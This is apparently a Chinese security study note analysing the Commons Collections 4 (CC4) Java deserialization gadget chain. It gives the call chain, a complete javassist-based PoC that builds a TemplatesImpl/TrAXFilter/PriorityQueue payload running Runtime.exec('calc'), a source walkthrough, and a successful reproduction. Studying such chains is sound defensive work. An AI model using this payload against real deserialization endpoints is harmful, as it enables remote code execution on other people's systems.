# 环境搭建

- JDK 1.7
- commons-collections 4.0
- javassist

和CC2的环境一样

```
<dependencies>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>
    <dependency>
        <groupId>org.javassist</groupId>
        <artifactId>javassist</artifactId>
        <version>3.25.0-GA</version>
    </dependency>
</dependencies>
```

# 前置知识

CC4是CC2和CC3的结合,准确的来说,CC4可以说是CC2的改编,两者唯一不同的点就是调用newTransformer方法,CC2是用反射调用的,CC4是和CC3一样用TrAXFilter来调用的

利用链

```
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                PriorityQueue.siftDownUsingComparator()
                    TransformingComparator.compare()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InstantiateTransformer.transform()
                            newInstance()
                                TrAXFilter#TrAXFilter()
                                TemplatesImpl.newTransformer()
                                         TemplatesImpl.getTransletInstance()
                                         TemplatesImpl.defineTransletClasses
                                         newInstance()
                                            Runtime.exec()
```

# 利用链分析

poc如下

```
package CC4;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


public class CC4Payload {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass STU = pool.makeClass("T0WN");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        STU.makeClassInitializer().insertBefore(cmd);
        STU.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        STU.writeFile();
        byte[] classbytes = STU.toBytecode();
        byte[][] targetbytecodes = new byte[][]{classbytes};

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFiledVlue(templates,"_name","DawnT0wn");
        setFiledVlue(templates,"_class",null);
        setFiledVlue(templates,"_bytecodes",targetbytecodes);

        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };

        ChainedTransformer chain = new ChainedTransformer(transforms);

        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(1);

        Object queue_array = new Object[]{1,2}; //这里因为调用了ConstantTransformer,所以调用ChainTransfomer的时候可以随便传参数不用像CC2那样传templates

        setFiledVlue(queue,"queue",queue_array);

        setFiledVlue(queue,"size",2);

        setFiledVlue(queue,"comparator",comparator);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CC4.bin"));
        os.writeObject(queue);

        ObjectInputStream fos =new ObjectInputStream(new FileInputStream("CC4.bin"));
        fos.readObject();
    }

    public static void setFiledVlue(Object obj,String Filename,Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(Filename);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
```

这条链和CC2大致相同,分析了CC2和CC3这条链就没有什么问题了

首先调用PriorityQueue重写的readObject方法

```
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
```

跟进heapify

```
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

和CC2一样,size需要大于等于2,可以利用add方法,可以利用反射

跟进siftDown

```
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
```

comparator不为空的话进入siftDownUsingComparator,继续跟进

![image-20220121192128125](images/1.png)

一直执行到第二个if,这里comparator的值可以通过反射控制,因为分析过CC2,就知道这里可以去调用TransformingComparator的compare方法,从而去触发transform方法

![image-20220121192332035](images/2.png)

到此为止,和CC2的前半截是一样的,唯一不同的是,在CC2中因为要直接调用InvokerTransformer利用反射去触发newTransform方法,所以需要控制参数obj1,然而在这里,是利用熟悉的ChainTransform类的transform挨个去调用ConstantTransformer和InstantiateTransformer的transform方法,ConstantTransformer的transform方法与传入的参数无关，所以这里的obj1可以为任意值

跟进transform方法,

这里就一直调用,ConstantTransformer的transform已经很熟悉了,直接返回一个可控值,主要还是InstantiateTransformer的transform方法,这里其实就是CC3的内容了

![image-20220121192851171](images/3.png)

可以看到和CC3一样通过反射去获取一个构造器,在CC3中我们已经找到了这样一个可用的类TrAXFilter,在

commons-collections 4.0仍然是可用的,通过构造器,iParamTypes和iArgs参数都是可控的

跟进TrAXFilter类构造器

![image-20220121193231105](images/4.png)

又回到了熟悉的调用newTransformer方法,传入的templates参数就是iArgs参数,是TemplatesImpl对象

跟进newTransformer方法

![image-20220121194543034](images/5.png)

跟进getTransletInstance方法

![image-20220121194603942](images/6.png)

接下来的东西就是加载字节码了,在CC2和CC3中已经提到了,都是一样的,

# 漏洞复现

![image-20220121194717498](images/7.png)

命令执行成功